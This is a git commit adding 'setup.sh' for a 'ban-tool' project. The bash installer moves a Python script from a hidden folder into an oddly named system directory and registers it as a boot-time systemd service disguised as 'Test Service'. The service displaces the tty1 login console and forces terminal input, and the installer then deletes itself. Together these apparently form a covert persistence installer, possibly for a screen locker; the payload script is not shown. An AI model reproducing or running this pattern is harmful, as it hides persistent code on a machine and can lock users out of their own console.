84b760b8892e2bc04892dae3447f6ff13e8cabdd
idk791 <105389895+idk791@users.noreply.github.com>
2022-05-11 19:39:08 +0000

    Add files via upload

---
+++ ban-tool/setup.sh
@@ -0,0 +1,34 @@
+#!/usr/bin/bash
+
+echo "[+] Setup ..."
+echo ""
+
+sudo mkdir /etc/systm-1/
+
+sudo mv .File/panel-ban.py /etc/systm-1/
+
+sudo touch /lib/systemd/system/test-py.service
+
+echo "[Unit]
+Description=Test Service
+After=multi-user.target
+Conflicts=getty@tty1.service
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python /etc/systm-1/panel-ban.py &
+StandardInput=tty-force
+
+[Install]
+WantedBy=multi-user.target" >> /lib/systemd/system/test-py.service
+
+sudo systemctl daemon-reload
+
+sudo systemctl enable test-py.service
+
+sudo systemctl start test-py.service
+
+
+sudo rm -rf "$PWD"/setup.sh
+
+exit
